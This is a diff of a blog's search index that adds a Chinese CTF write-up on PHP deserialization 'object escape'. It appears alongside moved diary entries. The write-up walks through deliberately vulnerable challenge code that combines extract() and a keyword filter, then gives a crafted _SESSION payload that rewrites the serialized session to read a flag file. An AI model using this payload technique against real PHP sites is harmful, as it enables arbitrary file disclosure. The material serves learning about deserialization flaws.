+<span class="token variable">$serialize_info</span> <span class="token operator">=</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$function</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'highlight_file'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'index.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$function</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'phpinfo'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'phpinfo();'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//maybe you can find something in here!</span>
+<span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$function</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'show_image'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    <span class="token variable">$userinfo</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$serialize_info</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$userinfo</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'img'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><font size="1">其实第一遍看的时候，只看出过滤和反序列化，以及三个 $function 带来的不同结果。</font></p>
+<p>里面的关键在于</p>
+<ul>
+<li><p><code>filter($img)</code></p>
+</li>
+<li><p><code>extract($_POST)</code></p>
+</li>
+<li><p><code>$serialize_info = filter(serialize($_SESSION));</code></p>
+</li>
+<li><p><code>$userinfo = unserialize($serialize_info);</code></p>
+<ul>
+<li><code>echo file_get_contents(base64_decode($userinfo[&#39;img&#39;]))</code></li>
+</ul>
+</li>
+</ul>
+<p>就写一点demo进行理解吧</p>
+<h2 id="filter-serialize"><a href="#filter-serialize" class="headerlink" title="filter &amp; serialize"></a>filter &amp; serialize</h2><h3 id="get-started"><a href="#get-started" class="headerlink" title="get started"></a>get started</h3><p>依照主要逻辑写了一个demo</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token comment">//过滤（照搬）</span>
+<span class="token keyword">function</span> <span class="token function-definition function">filter</span><span class="token punctuation">(</span><span class="token variable">$img</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    <span class="token variable">$filter_arr</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'pp5'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'php4'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token variable">$filter</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'/'</span><span class="token operator">.</span><span class="token function">implode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'|'</span><span class="token punctuation">,</span><span class="token variable">$filter_arr</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'/i'</span><span class="token punctuation">;</span>
+    <span class="token keyword">return</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token variable">$filter</span><span class="token punctuation">,</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span><span class="token variable">$img</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token comment">//传入的参数值</span>
+<span class="token variable">$img</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"this is a demo"</span><span class="token punctuation">;</span>
+
+<span class="token comment">//序列化</span>
+<span class="token variable">$n</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$img</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token comment">//过滤</span>
+<span class="token variable">$n1</span> <span class="token operator">=</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$n</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token comment">//反序列化</span>
+<span class="token variable">$n2</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$n1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token keyword">echo</span> <span class="token string single-quoted-string">'serialize: &lt;br>'</span><span class="token operator">.</span><span class="token variable">$n</span><span class="token operator">.</span><span class="token string single-quoted-string">'&lt;br>'</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token string single-quoted-string">'filter: &lt;br>'</span><span class="token operator">.</span><span class="token variable">$n1</span><span class="token operator">.</span><span class="token string single-quoted-string">'&lt;br>'</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token string single-quoted-string">'unserialize: &lt;br>'</span><span class="token punctuation">;</span>
+<span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$n2</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<ul>
+<li>当 <code>$img = &quot;this is a demo&quot;</code> 的时候，返回：</li>
+</ul>
+<pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">serialize:
+s:14:"this is a demo";
+filter:
+s:14:"this is a demo";
+unserialize:
+this is a demo<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<ul>
+<li>当<code>$img = array(&#39;y&#39;=&gt; &#39;u&#39;,&#39;x&#39; =&gt; &#39;fun&#39;);</code>的时候，返回：</li>
+</ul>
+<pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">serialize:
+a:2:&#123;s:1:"y";s:1:"u";s:1:"x";s:3:"fun";&#125;
+filter:
+a:2:&#123;s:1:"y";s:1:"u";s:1:"x";s:3:"fun";&#125;
+unserialize:
+array(2) &#123; ["y"]=> string(1) "u" ["x"]=> string(3) "fun" &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>一切都很正常。</p>
+<ul>
+<li>当 <code>$img = &quot;this is a flagdemo&quot;</code> 的时候，返回：</li>
+</ul>
+<pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">serialize:
+s:18:"this is a flagdemo";
+filter:
+s:18:"this is a demo";
+unserialize:<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<ul>
+<li>当<code>$img = array(&#39;y&#39;=&gt; &#39;flag&#39;,&#39;php&#39; =&gt; &#39;fun&#39;);</code>的时候，返回：</li>
+</ul>
+<pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">serialize:
+a:2:&#123;s:1:"y";s:4:"flag";s:3:"php";s:3:"fun";&#125;
+filter:
+a:2:&#123;s:1:"y";s:4:"";s:3:"";s:3:"fun";&#125;
+unserialize:
+bool(false)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+<p>发生了问题：</p>
+<p><strong>这个字符串无法被正确地反序列化。</strong>（当然这个不是重点但是有点funny）</p>
+<p>因为在序列化的字符串中，<code>s:18</code>表示接下来的字符串的长度应该是18。但是在<code>filter()</code>函数处理后，字符串的实际长度变为14，所以当你尝试使用<code>unserialize()</code>函数反序列化这个字符串时，它会返回<code>FALSE</code>，并产生一个<code>E_NOTICE</code>。</p>
+<p>如果是在其他题目，其实这种也很好绕过，双写 or 大小写（所以说正则表达式和白名单better at most of time）</p>
+<hr>
+<hr>
+
+<h3 id="abandoned"><a href="#abandoned" class="headerlink" title="abandoned"></a>abandoned</h3><p>unserialize()有一个机制</p>
+<ul>
+<li><code>&#123;&#125;</code><strong>内的会进行反序列，之外的抛弃。</strong></li>
+</ul>
+<p>如果<code>&#123;&#125;</code>内元素个数与规定的不一致会返回：<strong>bool(false)</strong></p>
+<p>比如：</p>
+<p><code>$dance = &quot;a:2:&#123;s:3:\&quot;one\&quot;;s:4:\&quot;flag\&quot;;s:3:\&quot;two\&quot;;s:4:\&quot;test\&quot;;&#125;;s:3:\&quot;ddimg\&quot;;lajilaji&quot;;</code></p>
+<ul>
+<li>反序列化得到：<code>array(2) &#123; [&quot;one&quot;]=&gt; string(4) &quot;flag&quot; [&quot;two&quot;]=&gt; string(4) &quot;test&quot; &#125;</code></li>
+</ul>
+<h2 id="SESSION"><a href="#SESSION" class="headerlink" title="SESSION"></a>SESSION</h2><h3 id="POST"><a href="#POST" class="headerlink" title="POST"></a>POST</h3><p><code>extract($_POST);</code>，作用是将 POST （看作一个数组）传入的 数组 中的元素进行变量化</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$_POST</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span>
+    <span class="token string single-quoted-string">'username'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'John Doe'</span><span class="token punctuation">,</span>
+    <span class="token string single-quoted-string">'email'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'john@example.com'</span>
+<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token comment">//得到</span>
+<span class="token variable">$username</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'John Doe'</span><span class="token punctuation">;</span>
+<span class="token variable">$email</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'john@example.com'</span><span class="token punctuation">;</span>
+
+<span class="token comment">//在之后的引用中，直接写</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>该函数存在的一个安全问题——操作不当会<strong>覆盖原有变量</strong>。</p>
+<p>这也是本题的关键之处之一。</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">//对存在的 $_SESSION进行重置 = NULL</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    <span class="token keyword">unset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token comment">//可以理解 $_SESSION 是一个数组，目前里面有这两个键值对</span>
+<span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"user"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'guest'</span><span class="token punctuation">;</span>
+<span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'function'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$function</span><span class="token punctuation">;</span>
+
+<span class="token operator">...</span><span class="token operator">.</span>
+<span class="token comment">//该变量值为序列化后再过滤的 $_SESSION</span>
+<span class="token variable">$serialize_info</span> <span class="token operator">=</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token operator">...</span>
+<span class="token comment">//在前提条件下 $userinfo 变量值为 反序列化 后的上面那个变量（太长了懒得打），最后通过 file_get_contents函数将 base64 解码后的 键为 img 的变量的值输出</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$function</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'show_image'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    <span class="token variable">$userinfo</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$serialize_info</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$userinfo</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'img'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token operator">...</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<hr>
+
+<p>简单一个demo test</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"user"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'guest'</span><span class="token punctuation">;</span>
+<span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'function'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$function</span><span class="token punctuation">;</span>
+
+<span class="token comment">//before</span>
+<span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br/>"</span><span class="token punctuation">;</span>
+
+<span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token comment">//after</span>
+<span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>POST传参：<code>_SESSION[flag]=123f</code>，结果是：</p>
+<p>&#x2F;&#x2F;before<br>array(2) { [“user”]&#x3D;&gt; string(5) “guest” [“function”]&#x3D;&gt; string(1) “f” }<br>&#x2F;&#x2F;after<br>array(1) { [“flag”]&#x3D;&gt; string(4) “123f” }</p>
+<p>this is<br><strong>变量覆盖</strong></p>
+<hr>
+<hr>
+
+<h1 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h1><p>先捋一下：</p>
+<ul>
+<li><p>filter进行黑名单过滤关键词和符号</p>
+</li>
+<li><p>序列化</p>
+</li>
+<li><p>extract()函数存在可控变量</p>
+</li>
+<li><p>在 <code>$function == &#39;show_image&#39;</code>条件下进行输出</p>
+</li>
+<li><p>$_SESSION 经过 <strong>序列化</strong> 经过 <strong>自定义过滤</strong> 经过 <strong>反序列化</strong> 最后 召唤 img 键值</p>
+</li>
+</ul>
+<p>所以重点来到究竟传参什么</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">//如果不存在 img_path 就赋值 $_SESSION['img'] 为 base64 编码后的 那个png</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'img_path'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'img'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'guest_img.png'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
+    <span class="token comment">//否则就赋值为 base64 编码后又SHA-1编码后的 img_path</span>
+    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'img'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'img_path'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token operator">...</span>
+<span class="token comment">//输出的是$_SESSION中的键 img 的值</span>
+<span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$userinfo</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'img'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>so,<br>传入一个抛弃原有 img 键值对的 <strong>新_SESSION</strong></p>
+<p><strong>构造（img 值要进行编码以适应解码）</strong>：<br><code>f = show_image</code>（GET传参构造条件）<br><code>_SESSION[flagflag]=&quot;;s:3:&quot;aaa&quot;;s:3:&quot;img&quot;;s:20:&quot;L2QwZzNfZmxsbGxsbGFn&quot;;&#125;</code></p>
+<br>
+<br>
+
+<p>经过上述$_SESSION的取经路，</p>
+<ul>
+<li><p>serialize构造出一个<br><code>a:1:&#123;s:8:&quot;flagflag&quot;;s:51:&quot;&quot;;s:3:&quot;aaa&quot;;s:3:&quot;img&quot;;s:20:&quot;L2QwZzNfZmxsbGxsbGFn&quot;;&#125;&quot;;&#125;</code></p>
+</li>
+<li><p>过滤一下<br><code>a:1:&#123;s:8:&quot;&quot;;s:51:&quot;&quot;;s:3:&quot;aaa&quot;;s:3:&quot;img&quot;;s:20:&quot;L2QwZzNfZmxsbGxsbGFn&quot;;&#125;&quot;;&#125;</code></p>
+</li>
+<li><p>真正起作用的(抛弃多余部分)<br><code>a:1:&#123;s:8:&quot;&quot;;s:51:&quot;&quot;;s:3:&quot;aaa&quot;;s:3:&quot;img&quot;;s:20:&quot;L2QwZzNfZmxsbGxsbGFn&quot;;&#125;</code></p>
+</li>
+</ul>
+<p>可以看到 img 键值已经出现且重写。</p>
+<p>接收响应会得到</p>
+<p><code>$flag = &#39;flag in /d0g3_fllllllag&#39;;</code></p>
+<img src="/rustymoon/2023/12/04/2019-easy-serialize-php/get.png" class>
+
+<p>将那段字符base64 后甩入img值中，接收响应得到flag。</p>
+<h1 id="Q"><a href="#Q" class="headerlink" title="Q"></a>Q</h1><p>其实payload在进行反序列化的时候会出现问题，返回bool(false)，但是为什么依旧可以进行，有点不理解。</p>
+<img src="/rustymoon/2023/12/04/2019-easy-serialize-php/boolfalse.png" class>
+]]></content>
+      <tags>
+        <tag>CTF</tag>
+        <tag>反序列化</tag>
       </tags>
   </entry>
   <entry>
@@ -1480,33 +1480,6 @@ database_name <span class="token operator">=</span> <span class="token string">'
       </tags>
   </entry>
   <entry>
-    <title>daily</title>
-    <url>/rustymoon/2023/11/26/daily/</url>
-    <content><![CDATA[<p>No Glamour in the hammer~</p>
-<span id="more"></span>
-
-<h1 id="11-26"><a href="#11-26" class="headerlink" title="11-26"></a>11-26</h1><p>这个周在当尖叫皇后，就是别人负责皇后我负责尖叫。</p>
-<p>我也不知道为什么这个周会过得如此迷惑的忙碌。</p>
-<p>可能是快来到的期末和一堆被冷落的作业。</p>
-<p>所以本周我就做了一个firewall ppt，做了实验课的实验一。</p>
-<p>迷茫、惶恐、无语、怒极反笑。</p>
-<p>总结一下就是，看见firewall这个词就想吐了。</p>
-<p>在周天晚上一把子把所有有关firewall的笔记都删除了，可能得缓缓才能写出笔记上传。而且我的课设作业和实验一个接一个，这辈子没这么烦过。</p>
-<p>之前还在问chatgpt怎么写weekly to-do list，现在我已经知道了。这么多破事（姑且让我这么称呼吧），好了写完这个我就要回去了，我要去买晚饭我要饿死了。</p>
-<p>回去路上整理to do list吧。<br>一张心情写照：</p>
-<img src="/rustymoon/2023/11/26/daily/%E9%9D%A2%E5%AF%B9jyp.jpg" class>
-
-<h1 id="11-27"><a href="#11-27" class="headerlink" title="11-27"></a>11-27</h1><p>今天稍微策划了一下时间，好了我现在要去学数电了，在这之前我学了ssrf和sql注入了的一部分，但是但是，还没有彻底搞懂，之前卡住我的那个demo问题原来是变量名少打一个h……这个键盘的h键真是……<br>配图以表心情：</p>
-<img src="/rustymoon/2023/11/26/daily/%E7%94%84%E5%AC%9B%E4%BC%A01.jpg" class>
-
-<h1 id="12-5"><a href="#12-5" class="headerlink" title="12-5"></a>12-5</h1><p>终于把这个主题进一步修改了……不过真的花了很长时间找有用的。<br>怎么这个学期就又要结束了？<br>期末袭来。</p>
-<h1 id="12-11"><a href="#12-11" class="headerlink" title="12-11"></a>12-11</h1><p>难以置信sql重学之后发现之前和没学一样。<br>有点烦。事情好多。但是都是karma我能怎么说。</p>
-]]></content>
-      <tags>
-        <tag>orn</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Hello World</title>
     <url>/rustymoon/2023/10/28/hello-world/</url>
     <content><![CDATA[<p>More info: <a href="https://hexo.io/docs">Deployment</a></p>
@@ -1635,6 +1608,33 @@ secert_key <span class="token operator">=</span> os<span class="token punctuatio
 
 <p>(参考一)[<a href="https://www.codenong.com/cs109680676/]">https://www.codenong.com/cs109680676/]</a><br>(参考二)[<a href="https://xz.aliyun.com/t/6050]">https://xz.aliyun.com/t/6050]</a><br>(参考三)[<a href="https://www.cnblogs.com/x1x20z/p/12890700.html]">https://www.cnblogs.com/x1x20z/p/12890700.html]</a><br>(参考四)[<a href="https://www.cnblogs.com/20175211lyz/p/11440316.html]">https://www.cnblogs.com/20175211lyz/p/11440316.html]</a></p>
 ]]></content>
+  </entry>
+  <entry>
+    <title>daily</title>
+    <url>/rustymoon/2023/11/26/daily/</url>
+    <content><![CDATA[<p>No Glamour in the hammer~</p>
+<span id="more"></span>
+
+<h1 id="11-26"><a href="#11-26" class="headerlink" title="11-26"></a>11-26</h1><p>这个周在当尖叫皇后，就是别人负责皇后我负责尖叫。</p>
+<p>我也不知道为什么这个周会过得如此迷惑的忙碌。</p>
+<p>可能是快来到的期末和一堆被冷落的作业。</p>
+<p>所以本周我就做了一个firewall ppt，做了实验课的实验一。</p>
+<p>迷茫、惶恐、无语、怒极反笑。</p>
+<p>总结一下就是，看见firewall这个词就想吐了。</p>
+<p>在周天晚上一把子把所有有关firewall的笔记都删除了，可能得缓缓才能写出笔记上传。而且我的课设作业和实验一个接一个，这辈子没这么烦过。</p>
+<p>之前还在问chatgpt怎么写weekly to-do list，现在我已经知道了。这么多破事（姑且让我这么称呼吧），好了写完这个我就要回去了，我要去买晚饭我要饿死了。</p>
+<p>回去路上整理to do list吧。<br>一张心情写照：</p>
+<img src="/rustymoon/2023/11/26/daily/%E9%9D%A2%E5%AF%B9jyp.jpg" class>
+
+<h1 id="11-27"><a href="#11-27" class="headerlink" title="11-27"></a>11-27</h1><p>今天稍微策划了一下时间，好了我现在要去学数电了，在这之前我学了ssrf和sql注入了的一部分，但是但是，还没有彻底搞懂，之前卡住我的那个demo问题原来是变量名少打一个h……这个键盘的h键真是……<br>配图以表心情：</p>
+<img src="/rustymoon/2023/11/26/daily/%E7%94%84%E5%AC%9B%E4%BC%A01.jpg" class>
+
+<h1 id="12-5"><a href="#12-5" class="headerlink" title="12-5"></a>12-5</h1><p>终于把这个主题进一步修改了……不过真的花了很长时间找有用的。<br>怎么这个学期就又要结束了？<br>期末袭来。</p>
+<h1 id="12-11"><a href="#12-11" class="headerlink" title="12-11"></a>12-11</h1><p>难以置信sql重学之后发现之前和没学一样。<br>有点烦。事情好多。但是都是karma我能怎么说。</p>
+]]></content>
+      <tags>
+        <tag>orn</tag>
+      </tags>
   </entry>
   <entry>
     <title>taocms审计中2</title>
